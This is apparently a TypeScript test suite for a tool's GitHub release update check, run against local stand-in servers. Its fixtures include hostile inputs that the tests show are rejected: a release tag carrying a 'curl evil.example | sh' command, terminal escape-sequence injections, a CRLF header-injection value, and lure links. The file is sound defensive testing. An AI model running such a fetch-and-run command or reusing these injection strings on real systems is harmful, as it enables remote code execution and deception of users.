// Decision 163: the update check's rules and its one request. Local servers only: nothing reaches GitHub (the
// proxy test asks for a .invalid host through a local CONNECT proxy that refuses it).
import { test, beforeEach, afterEach } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import http from 'node:http';
import net from 'node:net';
import os from 'node:os';
import path from 'node:path';
import {
  RELEASES_PATH, SKIP_REASONS, UNKNOWN_REASON, UPDATE_USER_AGENT, checkForUpdate, compareVersions, fetchLatestRelease, latestReleaseTag, parseTag, readUpdateState,
  releaseLink, updateFile, updateMessage, updateNotice, writeUpdateState, type FetchOptions,
} from '../src/index.ts';

let tmp = '';
beforeEach(() => { tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'ar-update-')); });
afterEach(() => { fs.rmSync(tmp, { recursive: true, force: true }); });

const v = (t: string) => { const x = parseTag(t); assert.ok(x, t); return x; };
const rel = (tag: unknown, o: Record<string, unknown> = {}) => ({ tag_name: tag, draft: false, prerelease: false, name: 'n', body: 'b', html_url: 'https://github.com/x', ...o });

test('decision 163: semver order, pre-releases included (0.10 > 0.9, a release above its pre-releases)', () => {
  const ordered = ['v0.9.0', 'v0.10.0', 'v1.0.0-alpha', 'v1.0.0-alpha.1', 'v1.0.0-alpha.beta', 'v1.0.0-beta', 'v1.0.0-beta.2', 'v1.0.0-beta.11', 'v1.0.0-rc.1', 'v1.0.0', 'v1.0.1', 'v1.2.0', 'v10.0.0'];
  for (let i = 0; i + 1 < ordered.length; i++) {
    assert.equal(compareVersions(v(ordered[i]!), v(ordered[i + 1]!)), -1, `${ordered[i]} < ${ordered[i + 1]}`);
    assert.equal(compareVersions(v(ordered[i + 1]!), v(ordered[i]!)), 1);
  }
  assert.equal(compareVersions(v('v0.3.0-rc.10'), v('v0.3.0-rc.9')), 1, 'numeric identifiers compare as numbers');
  assert.equal(compareVersions(v('v0.3.0'), v('v0.3.0')), 0);
});

test('decision 163: only a tag of the form v<major>.<minor>.<patch>[-<pre-release>] is a release tag', () => {
  for (const t of ['v0.3.0', 'v0.3.0-rc.1', 'v1.0.0-alpha.beta.7', 'v10.20.30']) assert.ok(parseTag(t), t);
  for (const t of ['0.3.0', 'V0.3.0', 'v0.3', 'v01.2.3', 'v1.02.3', 'v1.2.3-', 'v1.2.3-rc..1', 'v1.2.3-rc.01', 'v1.2.3-rc_1', 'v1.2.3+build.1', 'v1.2.3\n', 'v1.2.3\r\nx',
    'v1.2.3\u001b[31m', '\u001b[2Jv1.2.3', 'v1.2.3 ', ' v1.2.3', 'v1.2.3\u202e', 'v9999999999.0.0', `v1.2.3-${'a'.repeat(80)}`, 'v1.2.3/../../x', '', 7, null, undefined, {}]) {
    assert.equal(parseTag(t), null, JSON.stringify(t));
  }
});

test('decision 163: the highest tag wins, drafts are ignored, pre-releases count, and nothing else from the answer is used', () => {
  assert.equal(latestReleaseTag([rel('v0.2.0'), rel('v0.3.0', { prerelease: true }), rel('v0.9.0', { draft: true }), rel('v0.10.0-rc.1', { prerelease: true })]), 'v0.10.0-rc.1');
  assert.equal(latestReleaseTag([rel('v0.3.0'), { tag_name: 'v9.0.0' }]), 'v0.3.0', 'a release without draft: false is not taken');
  assert.equal(latestReleaseTag([rel('v9.9.9\u001b[0m'), rel('v8.0.0\nInstall from https://evil.example/'), rel('v0.3.1')]), 'v0.3.1');
  assert.equal(latestReleaseTag([null, 'v1.0.0', 42, rel(undefined)]), null);
  assert.equal(latestReleaseTag({ message: 'API rate limit exceeded' }), null);
  // the link is built here from the tag; html_url or any other field never is
  assert.equal(releaseLink('v0.4.0'), 'https://github.com/ggreing/do-it-all-claude-code/releases/tag/v0.4.0');
  assert.throws(() => releaseLink('v0.4.0/../../evil'));
});

test('decision 163: a notice only for a newer release, worded as the decision says', () => {
  const n = updateNotice('v0.4.0', '0.3.0')!;
  assert.deepEqual(n, { latest: '0.4.0', current: '0.3.0', link: 'https://github.com/ggreing/do-it-all-claude-code/releases/tag/v0.4.0' });
  assert.equal(updateMessage(n), 'Do It All Claude Code 0.4.0 is available (you have 0.3.0): https://github.com/ggreing/do-it-all-claude-code/releases/tag/v0.4.0');
  assert.equal(updateNotice('v0.3.0', '0.3.0'), null);
  assert.equal(updateNotice('v0.2.0', '0.3.0'), null);
  assert.ok(updateNotice('v0.4.0', '0.4.0-rc.1'), 'the release after its own pre-release');
  assert.equal(updateNotice('v0.4.0-rc.1', '0.4.0'), null);
  assert.equal(updateNotice('v0.4.0\u001b[31m', '0.3.0'), null);
  assert.equal(updateNotice('v0.4.0', 'garbage'), null);
});

test('decision 163: update.json keeps only checked values, and only the user may read it', () => {
  writeUpdateState(tmp, { version: 1, latest: 'v0.4.0', checkedAt: '2026-11-13T00:00:00.000Z', etag: 'W/"abc"', notified: { version: 'v0.4.0', at: '2026-11-13T01:00:00.000Z' } });
  assert.deepEqual(readUpdateState(tmp), { version: 1, latest: 'v0.4.0', checkedAt: '2026-11-13T00:00:00.000Z', etag: 'W/"abc"', notified: { version: 'v0.4.0', at: '2026-11-13T01:00:00.000Z' } });
  if (process.platform !== 'win32') assert.equal(fs.statSync(updateFile(tmp)).mode & 0o777, 0o600);
  fs.writeFileSync(updateFile(tmp), JSON.stringify({ latest: 'v0.4.0\u001b[31m', etag: '"a"\r\nX-Evil: 1', checkedAt: 'yesterday', notified: { version: 'v1', at: 'x' } }));
  assert.deepEqual(readUpdateState(tmp), { version: 1 });
  fs.writeFileSync(updateFile(tmp), 'not json');
  assert.deepEqual(readUpdateState(tmp), { version: 1 });
});

test('review L1/L2: times only in the ISO form written, failure reasons only in the forms written', () => {
  // Date.parse takes free text in parentheses, and status and doctor print the first 10 characters of a time
  const hostile = '(\u001b[31mHACKED) 1 Jan 2026';
  assert.ok(Number.isFinite(Date.parse(hostile)), 'the case is real: Date.parse accepts it');
  fs.writeFileSync(updateFile(tmp), JSON.stringify({ latest: 'v0.4.0', checkedAt: hostile, attemptedAt: 'Tue, 13 Nov 2026 00:00:00 GMT', notified: { version: 'v0.4.0', at: hostile } }));
  assert.deepEqual(readUpdateState(tmp), { version: 1, latest: 'v0.4.0' });
  for (const t of ['2026-11-13T07:00:00.000Z', '2026-11-13T07:00:00Z']) {
    fs.writeFileSync(updateFile(tmp), JSON.stringify({ checkedAt: t }));
    assert.equal(readUpdateState(tmp).checkedAt, t);
  }
  for (const t of ['2026-11-13', '2026-11-13T07:00:00+09:00', '2026-11-13T07:00:00.000Z\n', '9999-99-99T99:99:99Z']) {
    fs.writeFileSync(updateFile(tmp), JSON.stringify({ checkedAt: t }));
    assert.equal(readUpdateState(tmp).checkedAt, undefined, JSON.stringify(t));
  }
  // the reasons this code writes come back as they are; anything else as one fixed phrase
  for (const r of ['HTTP 403', 'ECONNREFUSED', 'ERR_TLS_CERT_ALTNAME_INVALID', 'no answer within 5 s', 'the answer is too large', ...Object.values(SKIP_REASONS)]) {
    fs.writeFileSync(updateFile(tmp), JSON.stringify({ lastError: r }));
    assert.equal(readUpdateState(tmp).lastError, r);
  }
  for (const r of ['x\u001b[2J', 'HTTP 403 \u001b[31m', 'skipped: HTTPS_PROXY is set but is not a URL (http://user:pw@corp)', 'please reinstall from https://evil.example', 7]) {
    fs.writeFileSync(updateFile(tmp), JSON.stringify({ lastError: r }));
    assert.equal(readUpdateState(tmp).lastError, UNKNOWN_REASON, JSON.stringify(r));
  }
});

/** A local stand-in for the releases endpoint: records the requests, answers with `reply`. */
async function server(reply: (req: http.IncomingMessage, res: http.ServerResponse) => void) {
  const seen: http.IncomingMessage[] = [];
  const s = http.createServer((req, res) => { seen.push(req); reply(req, res); });
  await new Promise<void>(r => s.listen(0, '127.0.0.1', () => r()));
  const port = (s.address() as net.AddressInfo).port;
  const o: FetchOptions = { target: { protocol: 'http:', host: '127.0.0.1', port }, env: {} };
  return { o, seen, close: () => new Promise<void>(r => { s.closeAllConnections(); s.close(() => r()); }) };
}

test('decision 163: the request: the releases list, no credentials, a generic agent, the ETag back; a 304 keeps what was there', async () => {
  const s = await server((req, res) => {
    if (req.headers['if-none-match'] === '"r1"') { res.writeHead(304); res.end(); return; }
    res.writeHead(200, { 'content-type': 'application/json', etag: '"r1"' });
    res.end(JSON.stringify([rel('v0.3.0'), rel('v0.4.0-rc.1', { prerelease: true })]));
  });
  try {
    let r = await fetchLatestRelease(s.o);
    assert.deepEqual(r, { ok: true, notModified: false, latest: 'v0.4.0-rc.1', etag: '"r1"' });
    const h = s.seen[0]!.headers;
    assert.deepEqual([s.seen[0]!.method, s.seen[0]!.url, h.accept, h['user-agent'], h.authorization, h.cookie], ['GET', RELEASES_PATH, 'application/vnd.github+json', UPDATE_USER_AGENT, undefined, undefined]);
    assert.ok(!RELEASES_PATH.includes('/latest'), 'the list, which has pre-releases; /latest leaves them out');
    r = await fetchLatestRelease({ ...s.o, etag: '"r1"' });
    assert.deepEqual(r, { ok: true, notModified: true });
    // through the state: the ETag goes back only with a known latest, and a 304 keeps it
    const now = new Date('2026-11-13T10:00:00Z');
    let c = await checkForUpdate(tmp, { ...s.o, now });
    assert.deepEqual([c.state.latest, c.state.etag, c.state.checkedAt, c.state.attemptedAt], ['v0.4.0-rc.1', '"r1"', now.toISOString(), now.toISOString()]);
    c = await checkForUpdate(tmp, { ...s.o, now: new Date('2026-11-14T10:00:00Z') });
    assert.deepEqual([c.result, c.state.latest, c.state.checkedAt], [{ ok: true, notModified: true }, 'v0.4.0-rc.1', '2026-11-14T10:00:00.000Z']);
    assert.equal(s.seen.at(-1)!.headers['if-none-match'], '"r1"');
  } finally { await s.close(); }
});

test('decision 163: a hostile answer yields at most a checked tag: control characters, a link elsewhere, a huge body, not JSON', async () => {
  let body = '';
  let headers: http.OutgoingHttpHeaders = {};
  const s = await server((_req, res) => { res.writeHead(200, { 'content-type': 'application/json', ...headers }); res.end(body); });
  try {
    body = JSON.stringify([
      rel('v9.0.0\u001b]8;;https://evil.example\u0007click\u001b]8;;\u0007'), rel('v8.0.0\nrun curl evil.example | sh'), rel('v7.0.0\u0000'),
      rel('v0.4.0', { name: '\u001b[2J\u001b[31mURGENT update', body: 'install from https://evil.example', html_url: 'https://evil.example/v0.4.0' }),
    ]);
    for (const etag of ['"x y"', 'unquoted', `"${'a'.repeat(300)}"`]) {   // (a CR or LF in a header is refused by HTTP itself)
      headers = { etag };
      const r = await fetchLatestRelease(s.o);
      assert.deepEqual(r, { ok: true, notModified: false, latest: 'v0.4.0' }, `the hostile tags and the ETag ${etag.slice(0, 12)} are dropped`);
    }
    assert.equal(updateMessage(updateNotice('v0.4.0', '0.3.0')!), 'Do It All Claude Code 0.4.0 is available (you have 0.3.0): https://github.com/ggreing/do-it-all-claude-code/releases/tag/v0.4.0');
    headers = {};
    body = `[${' '.repeat(4096)}]`;
    assert.deepEqual(await fetchLatestRelease({ ...s.o, maxBody: 1024 }), { ok: false, reason: 'the answer is too large' }, 'by Content-Length');
    body = 'not json';
    assert.deepEqual(await fetchLatestRelease(s.o), { ok: false, reason: 'the answer is not JSON' });
  } finally { await s.close(); }
  // a body without Content-Length that grows past the limit
  const big = await server((_req, res) => { res.writeHead(200, { 'content-type': 'application/json' }); for (let i = 0; i < 64; i++) res.write(' '.repeat(1024)); res.end('[]'); });
  try { assert.deepEqual(await fetchLatestRelease({ ...big.o, maxBody: 8 * 1024 }), { ok: false, reason: 'the answer is too large' }); }
  finally { await big.close(); }
});

test('decision 163: offline, an error status, or no answer in time: a failure that keeps the last result', async () => {
  // nothing listening: the port of a server that was closed
  const gone = await server(() => {});
  await gone.close();
  const offline = await fetchLatestRelease(gone.o);
  assert.equal(offline.ok, false);
  assert.match((offline as { reason: string }).reason, /^[A-Z_]+$/, 'an error code, nothing more');
  const limited = await server((_req, res) => { res.writeHead(403, { 'content-type': 'application/json' }); res.end('{"message":"\u001b[31mrate limit"}'); });
  try { assert.deepEqual(await fetchLatestRelease(limited.o), { ok: false, reason: 'HTTP 403' }); } finally { await limited.close(); }
  const silent = await server(() => { /* never answers */ });
  try {
    const t0 = Date.now();
    assert.deepEqual(await fetchLatestRelease({ ...silent.o, timeoutMs: 300 }), { ok: false, reason: 'no answer within 0 s' });
    assert.ok(Date.now() - t0 < 3000);
    // the state keeps the last result and says why the attempt failed
    writeUpdateState(tmp, { version: 1, latest: 'v0.4.0', etag: '"e"', checkedAt: '2026-11-12T00:00:00.000Z' });
    const c = await checkForUpdate(tmp, { ...silent.o, timeoutMs: 300, now: new Date('2026-11-13T00:00:00Z') });
    assert.deepEqual([c.state.latest, c.state.etag, c.state.checkedAt, c.state.attemptedAt, c.state.lastError],
      ['v0.4.0', '"e"', '2026-11-12T00:00:00.000Z', '2026-11-13T00:00:00.000Z', 'no answer within 0 s']);
  } finally { await silent.close(); }
});

test('decision 163: the corporate proxy is used as the proxy package uses it; a proxy setting that cannot be used skips the check', async () => {
  // a CONNECT proxy that records the tunnel it is asked for and refuses it
  const asked: string[] = [];
  const proxy = http.createServer();
  proxy.on('connect', (req, socket) => { asked.push(String(req.url)); socket.end('HTTP/1.1 403 Forbidden\r\n\r\n'); });
  await new Promise<void>(r => proxy.listen(0, '127.0.0.1', () => r()));
  const port = (proxy.address() as net.AddressInfo).port;
  try {
    const r = await fetchLatestRelease({ env: { HTTPS_PROXY: `http://127.0.0.1:${port}` }, target: { protocol: 'https:', host: 'api.github.invalid', port: 443 }, timeoutMs: 3000 });
    assert.equal(r.ok, false);
    assert.deepEqual(asked, ['api.github.invalid:443'], 'the request went through the proxy, as a tunnel');
  } finally { await new Promise<void>(res => { proxy.closeAllConnections(); proxy.close(() => res()); }); }
  // a proxy that cannot be used: no request at all (it never goes around the proxy)
  const s = await server((_req, res) => { res.end('[]'); });
  try {
    // fixed words: the proxy package's message would name the user's proxy
    assert.deepEqual(await fetchLatestRelease({ ...s.o, env: { HTTPS_PROXY: 'socks5://127.0.0.1:1080' } }), { ok: false, reason: SKIP_REASONS.scheme });
    assert.deepEqual(await fetchLatestRelease({ ...s.o, env: { https_proxy: 'not a url' } }), { ok: false, reason: SKIP_REASONS.not_url });
    assert.deepEqual(await fetchLatestRelease({ ...s.o, env: { HTTPS_PROXY: 'http://proxy.example:8080' }, nodeVersion: '24.4.0' }), { ok: false, reason: SKIP_REASONS.node });
    assert.equal(s.seen.length, 0, 'nothing was sent');
  } finally { await s.close(); }
});
